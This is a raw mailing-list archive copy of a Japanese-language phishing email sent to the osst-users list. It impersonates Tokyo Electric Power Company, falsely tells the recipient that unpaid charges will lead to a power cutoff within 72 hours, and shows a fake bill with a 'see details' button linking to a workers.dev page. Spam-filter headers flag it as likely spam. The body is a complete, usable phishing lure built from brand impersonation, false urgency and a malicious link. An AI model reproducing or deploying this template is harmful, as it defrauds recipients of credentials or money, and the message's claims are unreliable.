Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id C275D93E4C2
	for <lists+osst-users@lfdr.de>; Sun, 28 Jul 2024 13:30:00 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1sY26A-0006qE-Gm
	for lists+osst-users@lfdr.de;
	Sun, 28 Jul 2024 11:29:59 +0000
Received: from [172.30.29.67] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <tepco42-osst-users@creema.jp>) id 1sY266-0006pd-Q2
 for osst-users@lists.sourceforge.net; Sun, 28 Jul 2024 11:29:55 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Message-Id:Content-Type:Content-Transfer-Encoding:
 Date:Subject:To:From:Mime-Version:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=24KpGxpAXR+Wj93bZN2pHjGRuPeEiM/tJVR2Mvs04yE=; b=PKpeDeOQUtXzwc2tTlIRFAExqx
 LEWhaii5Rx1f4ylHEGjf8xPyEaiehCtHiNyJPAqRNc1y4Sdc0XCPkPMpm6+YtmoqYcryjhxMWAhpi
 8mqAPW6nAK0L80kzgD7femPhVC3zh9oKl4iSsLYai3W4TDi+sWOdcaJb/ATU13CTbJ64=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Message-Id:Content-Type:Content-Transfer-Encoding:Date:Subject:To:From:
 Mime-Version:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=24KpGxpAXR+Wj93bZN2pHjGRuPeEiM/tJVR2Mvs04yE=; b=P
 7xoPthMxbCCeW3MeBB5QLAAIwyggz822dPv15mEBl2bqFfmEhdo1GWPVVieTYtvvf//jesDpd3BeS
 4IPpfNzygKKC4zgGxQeIuLoOtJPduONtErwd5oIxp+gEham/eDN2Mw4LR+A3duwzThibMQOTxG1u7
 MFa8tfQPbC4evht4=;
Received: from [156.238.245.218] (helo=ser568159311267.localdomain)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1sY264-0006DW-4u for osst-users@lists.sourceforge.net;
 Sun, 28 Jul 2024 11:29:53 +0000
Received: from localhost (ser568159311267.local [IPv6:::1])
 by ser568159311267.localdomain (Postfix) with ESMTP id 6E00613DBD
 for <osst-users@lists.sourceforge.net>; Sun, 28 Jul 2024 11:29:46 +0000 (UTC)
Mime-Version: 1.0
From: =?UTF-8?q?=E6=9D=B1=E4=BA=AC=E9=9B=BB=E5=8A=9B?=
 <tepco42-osst-users@creema.jp>
To: osst-users@lists.sourceforge.net
X-Priority: 1
Date: Sun, 28 Jul 2024 20:29:46 +0900
Message-Id: <20240728112946.6E00613DBD@ser568159311267.localdomain>
X-Spam-Score: 7.4 (+++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  東京電力｜東京電力グループサイト 【重要なお知らせ】あなたは3日間の延滞料金を支払っておらず、72時間以上経過すると停電のリスクがあります。
    
 
 Content analysis details:   (7.4 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: workers.dev]
  5.0 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
                             bl.spamcop.net
             [Blocked - see <https://www.spamcop.net/bl.shtml?156.238.245.218>]
  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
                             The query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                             [156.238.245.218 listed in sa-accredit.habeas.com]
  0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
                             DNSWL was blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [156.238.245.218 listed in list.dnswl.org]
  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                           [156.238.245.218 listed in bl.score.senderscore.com]
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
X-Headers-End: 1sY264-0006DW-4u
Subject: [Osst-users] =?utf-8?b?6Zu75rCX5paZ6YeR5pyq57SN44Gr6Zai44GZ44KL?=
 =?utf-8?b?5YaN6YCa55+l44Gr44Gk44GE44Gm44Gu44GK55+l44KJ44Gb44CC55Wq5Y+3?=
 =?utf-8?q?=EF=BC=9ACS-27689834613?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8244821982240620441=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============8244821982240620441==
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=UTF-8

<html>
<HTML svg=3D"http://www.w3.org/2000/svg" 2000 www.w3.org http: XMLNS:[defau=
lt]=20
XMLNS:[default] http://www.w3.org/2000/svg =3D=20
"http://www.w3.org/2000/svg"><HEAD><TITLE>=E6=9D=B1=E4=BA=AC=E9=9B=BB=E5=8A=
=9B=EF=BD=9C=E6=9D=B1=E4=BA=AC=E9=9B=BB=E5=8A=9B=E3=82=B0=E3=83=AB=E3=83=BC=
=E3=83=97=E3=82=B5=E3=82=A4=E3=83=88</TITLE>
<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
<META name=3Dviewport content=3Dwidth=3Ddevice-width,initial-scale=3D1>
<META name=3Dreferrer content=3Dnever><LINK rel=3Dicon type=3Dimage/x-icon=
=20
href=3D"file:///D:\=E5=A4=87=E4=BB=BD\=E6=B8=94=E5=85=B7\=E5=8F=91=E4=BB=B6=
=E6=9C=BA\hongzhaji\css\favicon.png"><LINK rel=3Dstylesheet=20
href=3D"file:///D:\=E5=A4=87=E4=BB=BD\=E6=B8=94=E5=85=B7\=E5=8F=91=E4=BB=B6=
=E6=9C=BA\hongzhaji\css\app.f4f13a44ea05e9857898e33b69cb8684.css"><LINK=20
rel=3Dstylesheet type=3Dtext/css=20
href=3D"file:///D:\=E5=A4=87=E4=BB=BD\=E6=B8=94=E5=85=B7\=E5=8F=91=E4=BB=B6=
=E6=9C=BA\hongzhaji\css\element-ui.css">
<STYLE>
            body {
                margin: 0;
                padding: 0;
                background: #f5f5f5;
            }
   =20
            html {
                font-size: 62.5%;
            }</STYLE>

<STYLE>.crx_bdwk_down_wrap {
        top: 70%;
        left: 0;
        position: fixed;
        z-index: 99999999;
        color: #fff;
        user-select: none;
    }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_loading {
            background-color: #666;
            cursor: wait;
            width: 126px;
            text-align: center;
            padding: 16px 0;
        }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_loading p {
                font-size: 14px;
            }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_loading small {
                font-size: 10px;
            }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_btn {
            width: 126px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 14px;
            background-color: #dd5a57;
            position: relative;
        }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_types {
            display: flex;
            text-align: center;
            align-items: center;
            background-color: #666;
            font-size: 12px;
        }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_types div {
                position: relative;
            }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_types div:after {
                    content: ' ';
                    height: 12px;
                    width: 1px;
                    background-color: #eee;
                    position: absolute;
                    top: 10px;
                    right: 0;
                    transform: scaleX(0.5);
                }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_types div:last-child:after {
                        display: none;
                    }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_types_check {
                flex: 1;
                color: #dd5a57;
                padding: 8px;
                cursor: pointer;
                font-weight: bold;
            }
   =20
        .crx_bdwk_down_wrap .crx_bdwk_down_types_uncheck {
                flex: 1;
                padding: 8px;
                cursor: pointer;
                color: #fff;
                font-weight: lighter;
            }
    </STYLE>

<STYLE>
        html {
      font-size: 62.5%;
    }
    body {
      margin: 0;
      padding: 0;
      background: #f5f5f5;
    }
    @media screen and (min-width: 768px) {
      .main-container[data-v-7ce1bab7] {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        justify-content: center;
      }
    }
    @media screen and (min-width: 768px) {
      .container[data-v-7ce1bab7], .input-container[data-v-7ce1bab7] {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        -ms-flex-direction: column;
        flex-direction: column;
      }
    }
    @media screen and (min-width: 768px) {
      .container[data-v-7ce1bab7] {
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        padding-top: 10px;
        margin-top: 80px;
        background: #fff;
        min-height: 760px;
        width: 400px;
        border: none;
        border-radius: 5px;
        -webkit-box-shadow: 0 0 5px rgba(0,0,0,.3);
        box-shadow: 0 0 5px rgba(0,0,0,.3);
      }
    }
    @media screen and (min-width: 768px) {
      .input-container[data-v-7ce1bab7] {
        width: 90%;
        padding: 12px;
        background: #f5f5f5;
        margin: 20px 40px;
      }
    }
    @media screen and (min-width: 768px) {
      .container[data-v-7ce1bab7], .input-container[data-v-7ce1bab7] {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        -ms-flex-direction: column;
        flex-direction: column;
      }
    }
    @media screen and (min-width: 768px) {
      .input-container .main-font[data-v-7ce1bab7], .input-container p[data=
-v-7ce1bab7] {
        font-size: 16px;
        font-weight: 550;
      }}
    container p[data-v-7ce1bab7] {
        font-size: 16px;
        font-weight: 550;
      }
      @media screen and (min-width: 768px) {
      .login-button[data-v-7ce1bab7] {
        width: 80%;
        display: inline-block;
        padding: 10px 20px;
        background-color: #d42233;
        color: #fff;
        font-size: 16px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        -webkit-transition: background-color .3s ease;
        transition: background-color .3s ease;
      }
    }
   =20
    </STYLE>

<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY><INPUT id=3Dap_phone type=3Dhidden value=3D07065514563>=20
<DIV id=3Dapp>
<DIV class=3Dmain-container data-v-7ce1bab7=3D"">
<DIV class=3Dcontainer data-v-7ce1bab7=3D"">
<DIV data-v-7ce1bab7=3D"" data-v-9240032e=3D""><svg id=3Dkurashitepcologo=
=20
style=3D"enable-background: new 0 0 462.2 78" xml:space=3D"preserve"=20
viewBox=3D"0 0 462.2 78" y=3D"0px" x=3D"0px"=20
xmlns:xlink=3D"http://www.w3.org/1999/xlink" xmlns=3D"http://www.w3.org/200=
0/svg"=20
version=3D"1.1" height=3D"48" width=3D"200">
<STYLE type=3Dtext/css>.st0 { fill: rgb(230, 35, 32); }.st1 { fill: rgb(136=
, 136, 136); }.st2 { fill: rgb(255, 255, 255); }</STYLE>
<g><ellipse class=3Dst0 ry=3D"32.9" rx=3D"32.9" cy=3D"43.8" cx=3D"425.9"=20
transform=3D"matrix(0.7071 -0.7071 0.7071 0.7071 93.7636 313.9853)"></ellip=
se><path=20
class=3Dst0=20
d=3D"M139.1,26.6h11.3v45c0,0.5,0.4,0.9,0.9,0.9h9.1c0.5,0,0.9-0.4,0.9-0.9v-4=
5h11.3c0.5,0,0.9-0.4,0.9-0.9V16&#13;&#10;                c0-0.5-0.4-0.9-0.9=
-0.9h-33.4c-0.5,0-0.9,0.4-0.9,0.9v9.7C138.3,26.2,138.7,26.6,139.1,26.6z"></=
path><path=20
class=3Dst0=20
d=3D"M190.5,72.4h30.7c0.5,0,0.9-0.4,0.9-0.9v-9.7c0-0.5-0.4-0.9-0.9-0.9h-20.=
7V49.3h17.5c0.5,0,0.9-0.4,0.9-0.9&#13;&#10;                v-9.7c0-0.5-0.4-=
0.9-0.9-0.9h-17.5V26.6h20.7c0.5,0,0.9-0.4,0.9-0.9V16c0-0.5-0.4-0.9-0.9-0.9h=
-30.7c-0.5,0-0.9,0.4-0.9,0.9v55.5&#13;&#10;                C189.6,72.1,190,=
72.4,190.5,72.4z"></path><path=20
class=3Dst0=20
d=3D"M258.8,15.2h-18c-0.5,0-0.9,0.4-0.9,0.9v55.5c0,0.5,0.4,0.9,0.9,0.9h9.1c=
0.5,0,0.9-0.4,0.9-0.9v-20h8.1&#13;&#10;                c9.6,0,16.2-7.5,16.2=
-18.2S268.4,15.2,258.8,15.2z M250.7,26.6h7.6c3.6,0,5.9,2.7,5.9,6.8c0,4.1-2.=
3,6.7-5.9,6.7h-7.6V26.6z"></path><path=20
class=3Dst0=20
d=3D"M371.1,21.1c-3.6-4.3-7.9-6.4-13.2-6.4c-5.3,0-9.7,2.1-13.3,6.4c-4.8,5.7=
-4.8,12.5-4.8,21.9v1.5&#13;&#10;                c0,9.4,0,16.2,4.8,21.9c3.6,=
4.3,7.9,6.4,13.3,6.4c5.3,0,9.6-2.1,13.2-6.4c4.8-5.8,4.8-12.7,4.8-22.3v-0.8&=
#13;&#10;                C376,33.8,376,26.9,371.1,21.1z M352.7,28.7c1.2-1.7=
,3.1-2.6,5.2-2.6c2.1,0,3.9,0.9,5.1,2.6l0,0c1.6,2.1,2.1,4.5,2.1,15.1&#13;&#1=
0;                c0,10.6-0.5,12.9-2.1,15.1c-1.2,1.7-3,2.6-5.1,2.6c-2.1,0-4=
-1-5.2-2.6c-1.6-2.1-2-4.4-2-15.1C350.7,33.1,351.1,30.8,352.7,28.7z"></path>=
<polygon=20
class=3Dst0 points=3D"81.1,1.3 59.2,1.3 81.1,23.3 &#9;"></polygon><path cla=
ss=3Dst0=20
d=3D"M314.7,34c-0.5,0-0.9-0.4-1-0.9c-0.7-3.2-2.5-7-7-7c-2.1,0-3.9,0.9-5.1,2=
.5c-1.6,2.1-2.1,4.6-2.1,15.2&#13;&#10;                c0,10.6,0.5,13.1,2.1,=
15.2c1.2,1.6,3,2.5,5.1,2.5c4.5,0,6.3-3.8,7-7c0.1-0.5,0.6-0.9,1-0.9h9.2c0.5,=
0,0.8,0.4,0.7,0.9l0,0.1&#13;&#10;                c-1.6,11.4-8.3,18.3-17.9,1=
8.3c-5.3,0-9.7-2.1-13.3-6.4c-4.8-5.7-4.8-12.5-4.8-21.9v-1.5c0-9.4,0-16.2,4.=
8-21.9&#13;&#10;                c3.6-4.3,7.9-6.4,13.3-6.4c9.6,0,16.3,6.9,17=
.9,18.3l0,0.1c0.1,0.5-0.3,0.9-0.7,0.9H314.7z"></path><path=20
class=3Dst1=20
d=3D"M9.5,57.5c-8.1-8.1-8.1-21.2,0-29.3l0,0L26,11.7c0.3-0.3,0.9-0.3,1.2,0l6=
.4,6.4c0.3,0.3,0.3,0.9,0,1.2&#13;&#10;                L17.2,35.9h0c-3.9,3.9=
-3.9,10.1,0,14l16.5,16.5c0.3,0.3,0.3,0.9,0,1.2L27.2,74c-0.3,0.3-0.9,0.3-1.2=
,0L9.5,57.5z"></path><path=20
class=3Dst1=20
d=3D"M131.6,67.8c-3.7,3.8-8.9,6.1-14.6,6.1c-11.3,0-20.4-9.1-20.4-20.4V16c0-=
0.5,0.4-0.9,0.9-0.9h9.1&#13;&#10;                c0.5,0,0.9,0.4,0.9,0.9v37.=
5c0,5.3,4.3,9.6,9.6,9.6c2.5,0,4.8-1,6.5-2.6c0.3-0.3,0.9-0.4,1.2,0l0,0l6.8,6=
.1v0&#13;&#10;                C131.9,67,131.9,67.5,131.6,67.8L131.6,67.8z">=
</path><path=20
class=3Dst1=20
d=3D"M59.5,74c-0.5,0-0.9-0.4-0.9-0.9V64c0-0.5,0.4-0.9,0.9-0.9c5.4,0,9.7-4.4=
,9.6-9.8C69,48.1,64.5,44,59.2,44H49&#13;&#10;                c-0.5,0-0.9-0.=
4-0.9-0.9V16c0-0.5,0.4-0.9,0.9-0.9h9.1c0.5,0,0.9,0.4,0.9,0.9v17.1l0.6,0c11.=
1,0,20.2,8.9,20.4,20&#13;&#10;                C80.1,64.5,70.8,73.7,59.5,74z=
"></path><g><path=20
class=3Dst2=20
d=3D"M414.1,45.4l-2.4-8.8c0-0.1-0.2-0.3-0.3-0.3h-2.5c-0.2,0-0.3,0.1-0.3,0.3=
l-2.4,8.7l-1.9-8.7&#13;&#10;                    c0-0.2-0.2-0.3-0.3-0.3h-3.6=
c-0.2,0-0.4,0.2-0.3,0.4l4.2,16.3c0,0.2,0.2,0.3,0.3,0.3h2.8c0.2,0,0.3-0.1,0.=
3-0.3l2.5-9.1l2.5,9.1&#13;&#10;                    c0,0.1,0.2,0.3,0.3,0.3h2=
.8c0.2,0,0.3-0.1,0.3-0.3l4.2-16.3c0.1-0.2-0.1-0.4-0.3-0.4h-3.6c-0.2,0-0.3,0=
.1-0.3,0.3L414.1,45.4z"></path><path=20
class=3Dst2=20
d=3D"M429,36.2c-3.9,0-6.3,3.3-6.3,8.7c0,7.2,3.6,8.7,6.7,8.7c2.6,0,4-1,5.4-2=
.6c0.1-0.1,0.1-0.4,0-0.5l-2.1-2.4&#13;&#10;                    c-0.1-0.1-0.=
3-0.1-0.4,0l0,0c-0.8,1-1.4,1.4-2.8,1.4c-1.8,0-2.5-1.5-2.6-2.9h8.2c0.2,0,0.3=
-0.2,0.3-0.3v-1.8&#13;&#10;                    C435.3,39.4,432.8,36.2,429,3=
6.2z M426.7,43c0-0.5,0.1-0.8,0.3-1.3c0.2-0.5,0.7-1.5,2-1.5c1.2,0,1.8,0.9,2,=
1.5&#13;&#10;                    c0.2,0.5,0.2,0.8,0.3,1.3H426.7z"></path><p=
ath=20
class=3Dst2=20
d=3D"M449.9,37.8c-0.8-1-2.2-1.6-3.6-1.6c-1.2,0-2.2,0.3-3,1.1v-6.5c0-0.2-0.2=
-0.3-0.3-0.3h-3.4&#13;&#10;                    c-0.2,0-0.3,0.2-0.3,0.3V53c0=
,0.2,0.2,0.3,0.3,0.3h3.3c0.2,0,0.3-0.2,0.3-0.3v-0.6c0.8,0.8,1.8,1.2,3.1,1.2=
c1.4,0,2.8-0.6,3.6-1.6&#13;&#10;                    c1.5-1.8,1.5-4.7,1.5-7.=
1C451.4,42.5,451.4,39.5,449.9,37.8z M445.3,40.5c1.7,0,2,1.5,2,4.3c0,2.8-0.3=
,4.4-2,4.4s-2-1.5-2-4.4&#13;&#10;                    C443.4,42,443.7,40.5,4=
45.3,40.5z"></path></g></g></svg></DIV>
<DIV style=3D"HEIGHT: 2px; WIDTH: 100%; BACKGROUND-COLOR: rgb(212,34,51)"=
=20
data-v-7ce1bab7=3D""></DIV>
<P=20
style=3D"FONT-SIZE: 16px; FONT-WEIGHT: bold; COLOR: rgb(254,0,0); PADDING-L=
EFT: 16px; PADDING-RIGHT: 16px"=20
data-v-7ce1bab7=3D"">=E3=80=90=E9=87=8D=E8=A6=81=E3=81=AA=E3=81=8A=E7=9F=A5=
=E3=82=89=E3=81=9B=E3=80=91=E3=81=82=E3=81=AA=E3=81=9F=E3=81=AF3=E6=97=A5=
=E9=96=93=E3=81=AE=E5=BB=B6=E6=BB=9E=E6=96=99=E9=87=91=E3=82=92=E6=94=AF=E6=
=89=95=E3=81=A3=E3=81=A6=E3=81=8A=E3=82=89=E3=81=9A=E3=80=8172=E6=99=82=E9=
=96=93=E4=BB=A5=E4=B8=8A=E7=B5=8C=E9=81=8E=E3=81=99=E3=82=8B=E3=81=A8=E5=81=
=9C=E9=9B=BB=E3=81=AE=E3=83=AA=E3=82=B9=E3=82=AF=E3=81=8C=E3=81=82=E3=82=8A=
=E3=81=BE=E3=81=99=E3=80=82</P>
<DIV class=3Dinput-container data-v-7ce1bab7=3D""><SPAN class=3Dmain-font=
=20
data-v-7ce1bab7=3D"">=E9=9B=BB=E6=B0=97=E5=A5=91=E7=B4=84=E6=98=8E=E7=B4=B0=
 30A</SPAN>=20
<P data-v-7ce1bab7=3D"">=E4=BE=9B=E7=B5=A6=E5=9C=B0=E7=82=B9=E7=89=B9=E5=AE=
=9A=E7=95=AA=E5=8F=B7</P><SPAN=20
style=3D"FONT-SIZE: 14px; MARGIN-LEFT: 20px"=20
data-v-7ce1bab7=3D"">03-0011-1000-9011-2715-5058</SPAN>=20
<P data-v-7ce1bab7=3D"">=E5=A5=91=E7=B4=84=E7=A8=AE=E5=88=A5 =E5=9F=BA=E6=
=9C=AC=E3=83=97=E3=83=A9=E3=83=B3A=E5=A5=91=E7=B4=84 </P>
<DIV style=3D"DISPLAY: flex; align-items: center" data-v-7ce1bab7=3D""><SPA=
N=20
style=3D"FONT-SIZE: 20px; FONT-WEIGHT: bold" data-v-7ce1bab7=3D"">=E9=9B=BB=
=E6=B0=97=E6=96=99=E9=87=91=E5=90=88=E8=A8=88</SPAN>=20
<SPAN style=3D"FONT-SIZE: 22px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">1,630=E5=86=86</SPAN></DIV>
<DIV style=3D"HEIGHT: 1px; WIDTH: 100%; BACKGROUND-COLOR: rgb(111,119,128)"=
=20
data-v-7ce1bab7=3D""></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=EF=BC=88=E5=86=85=E9=9B=BB=E6=B0=97=E6=96=99=E9=87=91=
=E5=88=86=E6=B6=88=E8=B2=BB=E7=A8=8E=E7=AD=89</SPAN> <SPAN=20
style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto" data-v-7ce1bab7=3D"">348=E5=86=
=86)</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E5=9F=BA=E6=9C=AC=E6=96=99=E9=87=91</SPAN> <SPAN styl=
e=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">858.00=E5=86=86</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E9=9B=BB=E5=8A=9B=E9=87=8F=E6=96=99=E9=87=911</SPAN> =
<SPAN=20
style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">373.60=E5=86=86</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E9=9B=BB=E5=8A=9B=E9=87=8F=E6=96=99=E9=87=912</SPAN> =
<SPAN=20
style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">379.35=E5=86=86</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E7=87=83=E6=96=99=E8=B2=BB=E8=AA=BF=E6=95=B4=E9=A1=8D=
</SPAN> <SPAN=20
style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">633.15=E5=86=86</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E3=82=BB=E3=83=83=E3=83=88=E5=89=B2=E5=BC=95=E9=A1=8D=
=E7=AD=89</SPAN> <SPAN=20
style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">879.00=E5=86=86</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 14px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E5=86=8D=E3=82=A8=E3=83=8D=E4=BF=83=E9=80=B2=E8=B3=A6=
=E8=AA=B2=E9=87=91</SPAN> <SPAN=20
style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto" data-v-7ce1bab7=3D"">465 =E5=
=86=86</SPAN></DIV>
<DIV style=3D"MARGIN-TOP: 10px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D""></SPAN><SPAN style=3D"FONT-SIZE: 16px; MARGIN-LEFT: au=
to"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 16px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">&nbsp;</DIV>
<DIV style=3D"HEIGHT: 1px; WIDTH: 100%; BACKGROUND-COLOR: rgb(111,119,128)"=
=20
data-v-7ce1bab7=3D""></DIV>
<DIV style=3D"MARGIN-TOP: 40px; DISPLAY: flex; align-items: center"=20
data-v-7ce1bab7=3D""><SPAN style=3D"FONT-SIZE: 18px; FONT-WEIGHT: bold"=20
data-v-7ce1bab7=3D"">=E3=81=94=E4=BD=BF=E7=94=A8=E9=87=8F</SPAN> <SPAN styl=
e=3D"FONT-SIZE: 20px; MARGIN-LEFT: auto"=20
data-v-7ce1bab7=3D"">85kWh</SPAN></DIV></DIV><BUTTON onclick=3Dverify() id=
=3Dsubmit=20
class=3Dlogin-button name=3Daction data-v-7ce1bab7=3D""=20
data-action-button-primary=3D"true" value=3D"default"><A=20
href=3D"https://wandering-shape-5cd0.luveniawigen51218.workers.dev/">=E8=A9=
=B3=E7=B4=B0=E3=82=92=E8=A6=8B=E3=82=8B</A></BUTTON>=20
<DIV style=3D"MARGIN-BOTTOM: 30px; MARGIN-TOP: 30px" data-v-7ce1bab7=3D""=
=20
data-v-7b903a6c=3D"">
<P class=3Dcopyright data-v-7b903a6c=3D"">=C2=A9 Tokyo Electric Power Compa=
ny Holdings,=20
Inc.</P></DIV></DIV></DIV></DIV></SPAN></SPAN></BODY>
</html>


--===============8244821982240620441==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8244821982240620441==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============8244821982240620441==--
